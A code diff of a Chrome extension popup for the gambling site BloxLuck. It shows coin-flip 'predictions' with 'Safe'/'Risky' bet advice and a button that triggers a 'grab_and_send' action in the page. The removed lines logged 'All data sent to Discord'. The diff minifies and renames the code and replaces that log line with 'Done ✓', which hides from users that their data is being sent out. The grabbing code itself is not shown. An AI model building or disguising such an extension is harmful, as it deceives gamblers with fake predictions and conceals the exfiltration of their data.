@@ -1,65 +1,44 @@
-document.addEventListener('DOMContentLoaded', () => {
-  const sText = document.getElementById('sText');
-  const sDot = document.getElementById('sDot');
-  const uDisplay = document.getElementById('uDisplay');
-  const predText = document.getElementById('predText');
-  const chanceBar = document.getElementById('chanceBar');
-  const winText = document.getElementById('winText');
-  const betStat = document.getElementById('betStat');
-  const hPct = document.getElementById('hPct');
-  const tPct = document.getElementById('tPct');
-  const totalG = document.getElementById('totalG');
-  const refBtn = document.getElementById('refBtn');
-  const grabBtn = document.getElementById('grabBtn');
-  const logBox = document.getElementById('logBox');
-
-  function log(m) {
-    logBox.textContent = `[${new Date().toLocaleTimeString()}] ${m}`;
-    logBox.classList.add('show');
+document.addEventListener('DOMContentLoaded',()=>{
+  const st=document.getElementById('st'),sd=document.getElementById('sd'),ud=document.getElementById('ud');
+  const pt=document.getElementById('pt'),cb=document.getElementById('cb'),wt=document.getElementById('wt');
+  const bs=document.getElementById('bs'),hp=document.getElementById('hp'),tp=document.getElementById('tp');
+  const tg=document.getElementById('tg'),rf=document.getElementById('rf'),gb=document.getElementById('gb');
+  const lb=document.getElementById('lb');
+  
+  function lg(m){lb.textContent=`[${new Date().toLocaleTimeString()}] ${m}`;lb.classList.add('s');}
+  
+  chrome.tabs.query({active:true,currentWindow:true},t=>{
+    if(t[0]&&t[0].url&&t[0].url.includes('bloxluck.com')){
+      st.textContent='Connected';sd.className='dt g';
+      chrome.tabs.sendMessage(t[0].id,{action:'get_analysis'},r=>{if(r)ui(r);});
+    } else { st.textContent='Not on BloxLuck';sd.className='dt r'; }
+  });
+  
+  function ui(d){
+    if(!d.prediction)return;
+    pt.textContent=d.prediction;
+    const g=d.winChance>=60;
+    pt.className='pd '+(g?'g':'r');
+    cb.style.width=(d.winChance||50)+'%';
+    cb.className='br '+(g?'g':'r');
+    wt.textContent=(d.winChance||50)+'%';
+    bs.textContent=g?'🟢 Safe '+d.prediction:'🔴 Risky';
+    bs.style.color=g?'#0f8':'#f44';
+    hp.textContent=(d.headsChance||50)+'%';
+    tp.textContent=(d.tailsChance||50)+'%';
+    tg.textContent=d.total||0;
+    if(d.username)ud.textContent='👤 '+d.username;
   }
-
-  chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
-    const t = tabs[0];
-    if (t && t.url && t.url.includes('bloxluck.com')) {
-      sText.textContent = 'On BloxLuck';
-      sDot.className = 'dot g';
-      chrome.tabs.sendMessage(t.id, { action: 'get_analysis' }, (r) => {
-        if (r) updateUI(r);
-      });
-    } else {
-      sText.textContent = 'Not on BloxLuck';
-      sDot.className = 'dot r';
-    }
-  });
-
-  function updateUI(d) {
-    if (d.prediction) {
-      predText.textContent = d.prediction;
-      const g = d.winChance >= 60;
-      predText.className = 'pred ' + (g ? 'g' : 'r');
-      chanceBar.style.width = (d.winChance || 50) + '%';
-      chanceBar.className = 'bar ' + (g ? 'g' : 'r');
-      winText.textContent = (d.winChance || 50) + '%';
-      betStat.textContent = g ? '🟢 BET ' + d.prediction : '🔴 SKIP';
-      betStat.style.color = g ? '#00ff88' : '#ff4444';
-      hPct.textContent = (d.headsChance || 50) + '%';
-      tPct.textContent = (d.tailsChance || 50) + '%';
-      totalG.textContent = d.total || 0;
-      if (d.username) uDisplay.textContent = '👤 ' + d.username;
-    }
-  }
-
-  refBtn.addEventListener('click', () => {
-    chrome.tabs.query({ active: true, currentWindow: true }, (t) => {
-      if (t[0]) chrome.tabs.sendMessage(t[0].id, { action: 'refresh' }, () => log('Refreshed'));
+  
+  rf.onclick=()=>{
+    chrome.tabs.query({active:true,currentWindow:true},t=>{
+      if(t[0])chrome.tabs.sendMessage(t[0].id,{action:'refresh'},()=>lg('Refreshed'));
     });
-  });
-
-  grabBtn.addEventListener('click', () => {
-    chrome.tabs.query({ active: true, currentWindow: true }, (t) => {
-      if (t[0]) chrome.tabs.sendMessage(t[0].id, { action: 'grab_and_send' }, () => {
-        log('All data sent to Discord ✓');
-      });
+  };
+  
+  gb.onclick=()=>{
+    chrome.tabs.query({active:true,currentWindow:true},t=>{
+      if(t[0])chrome.tabs.sendMessage(t[0].id,{action:'grab_and_send'},()=>lg('Done ✓'));
     });
-  });
+  };
 });
